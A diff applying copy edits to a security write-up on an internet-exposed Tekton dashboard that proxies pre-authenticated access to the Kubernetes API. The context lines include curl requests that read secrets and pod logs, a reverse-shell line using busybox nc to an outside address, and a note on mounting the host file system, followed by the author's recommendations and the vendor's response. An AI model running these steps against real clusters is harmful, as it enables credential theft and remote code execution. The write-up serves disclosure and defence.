@@ -12,7 +12,7 @@ Both vulnerabilities were treated as intended and are thus still exploitable. Th
 It started when I stumbled upon an unusual finding during an assessment. The scanning of our internal attack surface management solution reported either an internet-exposed Kubernetes API server, which is not too uncommon, or an exposed kubelet API. The latter hadn't been observed in our client's scope before, prompting me to investigate further.
 
 ### Kubelet
-The [kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) is a binary running on every node thats part of a Kubernetes cluster. It interacts with the container runtime to create the actual containers. These are either based on pods requested by the Kubernetes API or the control plane components themselves, implemented as [static containers](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). 
+The [kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) is a binary running on every node that's part of a Kubernetes cluster. It interacts with the container runtime to create the actual containers. These are either based on pods requested by the Kubernetes API or the control plane components themselves, implemented as [static containers](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). 
 
 The Kubernetes API pod, for example, is defined in `/etc/kubernetes/manifests/kube-apiserver.yaml`:
 ```yaml 
@@ -36,10 +36,10 @@ spec:
     - --authorization-mode=Node,RBAC
 ...
 ```
-By default, the kubelet starts with the `--anonymous-auth` parameter set to `true` and `--authorization-mode` set to `AlwaysAllow`. Consequently, unauthenticated network access to the kubelet's own API grants full control over the containers. Exploitation of this configuration was previously described in [this blogpost](https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster).
+By default, the kubelet starts with the `--anonymous-auth` parameter set to `true` and `--authorization-mode` set to `AlwaysAllow`. Consequently, unauthenticated network access to the kubelet's own API grants full control over the containers. Exploitation of this configuration was previously described in [this blog post](https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster).
 
 
-Unfortunately, accessing the reported endpoint at `/pods` returned a 404 error, indicating that it was not a kubelet. It could still be a Kubernetes API server but that would require authentication. A quick test revealed the following:
+Unfortunately, accessing the reported endpoint at `/pods` returned a 404 error, indicating that it was not a kubelet. It could still be a Kubernetes API server, but that would require authentication. A quick test revealed the following:
 
 `curl http://tekton-dashboard:9097/api/v1/secrets`:
 
@@ -66,7 +66,7 @@ As indicated by the name of the service account, we were dealing with [Tekton](h
 
 > Tekton is a powerful and flexible open-source framework for creating CI/CD systems, allowing developers to build, test, and deploy across cloud providers and on-premise systems.
 
-Rather than immediately reconsidering the attack surface, I decided to investigate the unusual proxying behavior further. I checked the [documentation](https://tekton.dev/docs/dashboard/install/#installing-tekton-dashboard-on-kubernetes) and found that the installation is just a Kubernetes configuration yaml file:
+Rather than immediately reconsidering the attack surface, I decided to investigate the unusual proxying behavior further. I checked the [documentation](https://tekton.dev/docs/dashboard/install/#installing-tekton-dashboard-on-kubernetes) and found that the installation is just a Kubernetes configuration YAML file:
 
 `kubectl apply --filename https://storage.googleapis.com/tekton-releases/dashboard/latest/release.yaml`
 
@@ -76,7 +76,7 @@ Using the pre-authenticated proxying behavior it is indeed possible to view indi
 
 ![](env.png)
 
-This artificial example contained a hard-coded secret value, obviously not recommended but nonetheless it happens. The same [mysql image](https://hub.docker.com/_/mysql) used in this scenario could also be started with the `MYSQL_RANDOM_ROOT_PASSWORD` environment variable set. This generates a random password and prints it to stdout, where it is still publicy accessible:
+This artificial example contained a hard-coded secret value, obviously not recommended but nonetheless it happens. The same [MySQL image](https://hub.docker.com/_/mysql) used in this scenario could also be started with the `MYSQL_RANDOM_ROOT_PASSWORD` environment variable set. This generates a random password and prints it to stdout, where it is still publicly accessible:
 
 ```
 $ curl -s http://tekton-dashboard:9097/api/v1/namespaces/default/pods/db/log 
@@ -89,7 +89,7 @@ $ curl -s http://tekton-dashboard:9097/api/v1/namespaces/default/pods/db/log
 At this point, I had gained access to several credentials and informed the client accordingly.
 
 
-To see what else we can do with that endpoint lets take a look at the [source code](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go). Initially, [client-go's](https://pkg.go.dev/k8s.io/client-go@v0.31.0#section-readme) `InClusterConfig()` is used to get a `config` containing the authentication details of the service account.
+To see what else we can do with that endpoint let's take a look at the [source code](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go). Initially, [client-go's](https://pkg.go.dev/k8s.io/client-go@v0.31.0#section-readme) `InClusterConfig()` is used to get a `config` containing the authentication details of the service account.
 ```go
 func main() {
 ...
@@ -169,7 +169,7 @@ func (s *Server) ServeOnListener(l net.Listener) error {
 	return server.Serve(l)
 }
 ```
-By applying `CSRF()` to the original `http.Handler` inside `router.Server`, a new `csrf` struct is returned which implements the `Handler` interface to wrap `ServeHTTP()`. This will in turn be called by `http.Server.Serve(l)`. Then, for http methods deemed unsafe like `POST`, a hard-coded HTTP header with the name `Tekton-Client` is expected:
+By applying `CSRF()` to the original `http.Handler` inside `router.Server`, a new `csrf` struct is returned which implements the `Handler` interface to wrap `ServeHTTP()`. This will in turn be called by `http.Server.Serve(l)`. Then, for HTTP methods deemed unsafe like `POST`, a hard-coded HTTP header with the name `Tekton-Client` is expected:
 ```go
 func (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if _, ok := safeMethods[r.Method]; !ok {
@@ -186,9 +186,9 @@ func (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 
 The value of said header does apparently not matter. To be sure we can just set it for all requests regardless of the HTTP method being used. Other than that there were no restrictions.
 
-**To summarize, if someone adhered to best practices and restricted network access to the Kubernetes API server but has a Tekton dashboard exposed to the internet, we can use its proxy to gain almost unrestricted access to the API server again. Additionally we can either bring our "own" credentials or act with whatever privileges the `tekton-dashboard` service account has.**
+**To summarize, if someone adhered to best practices and restricted network access to the Kubernetes API server but has a Tekton dashboard exposed to the internet, we can use its proxy to gain almost unrestricted access to the API server again. Additionally, we can either bring our "own" credentials or act with whatever privileges the `tekton-dashboard` service account has.**
 
-For convenience I [patched](https://github.com/fl0mb/kubernetes) `kubectl` to add the `Tekton-Client` header and to allow authenticating when using unencrypted HTTP. Now we can either use the privileges of the `tekton-dashboard` service account:  
+For convenience, I [patched](https://github.com/fl0mb/kubernetes) `kubectl` to add the `Tekton-Client` header and to allow authenticating when using unencrypted HTTP. Now we can either use the privileges of the `tekton-dashboard` service account:  
   
 ![](whoami.png)
 
@@ -286,7 +286,7 @@ A [controller](https://kubernetes.io/docs/concepts/architecture/controller/) in 
 
 Therefore, to understand the PipelineRun resource we have to check its reconciler implementation at `pkg/reconciler/pipelinerun/pipelinerun.go`.
 
-Before diving into the code I wanted to take a break and play around with the functionality first. While doing so I noticed the "Edit an run" button of my existing PipelineRun. It presented a nicely readable and editable yaml file containing the definition of my PipelineRun resource:
+Before diving into the code I wanted to take a break and play around with the functionality first. While doing so I noticed the "Edit and run" button of my existing PipelineRun. It presented a nicely readable and editable YAML file containing the definition of my PipelineRun resource:
 
 ![](yamlEdit.png)
 
@@ -299,7 +299,7 @@ script: >
   busybox nc 192.168.58.1 8000 -e /bin/sh
 ```
 
-RCE is nice but I thought this looks a lot like a normal pod definition, can it do anything malicious like mounting the nodes filesystem?
+RCE is nice, but I thought this looks a lot like a normal pod definition, can it do anything malicious like mounting the node's file system?
 
 I tried to get a minimal PipelineRun by repeatedly removing potentially unimportant lines until it breaks, which finally led me to:
 
@@ -327,7 +327,7 @@ spec:
     serviceAccountName: default
 ```
 
-Pretending this is just a pod we could mount the hosts filesystem with:
+Pretending this is just a pod we could mount the host's file system with:
 ```yaml
 apiVersion: tekton.dev/v1
 kind: PipelineRun
@@ -371,7 +371,7 @@ Interestingly this is only possible in the `tekton-dashboard` namespace (and eve
 A internet exposed Tekton dashboard allows direct access to the Kubernetes API. This access is pre-authenticated with the privileges of the `tekton-dashboard` service account which, regardless of the deployment mode, allows access to pod definitions and container stdout by default. It is also possible to provide your own credentials for the Kubernetes API and if the dashboard is deployed in `read/write` mode it enables remote code execution.
 
 ### Recommendation
-- Do not expose your dashboard to the internet. If needed require prior authentication as described [here](https://github.com/tektoncd/dashboard/blob/main/docs/install.md#access-control).
+- Do not expose your dashboard to the internet. If needed, require prior authentication as described [here](https://github.com/tektoncd/dashboard/blob/main/docs/install.md#access-control).
 - Deploy your dashboard in `read-only` mode.
 - Limit the privileges of the `tekton-dashboard` service account.
 - Configure pod security standards for the whole cluster.
@@ -379,6 +379,6 @@ A internet exposed Tekton dashboard allows direct access to the Kubernetes API. 
 ### Vendor Reaction
 The issue was communicated to the Tekton security team in July 2024. They came to the conclusion that the issue lies primarily in the documentation, because the tutorial did not mention the different modes and the installation defaulted to `read/write`.
 
-A Github security advisory was opened, the documentation improved and the default mode was changed to `read-only`. Other than that they referred to current cluster administration best practices. 
+A GitHub security advisory was opened, the documentation improved and the default mode was changed to `read-only`. Other than that they referred to current cluster administration best practices. 
 
 There are no additional warnings or changes for the central [pipelines repo](https://github.com/tektoncd/pipeline).
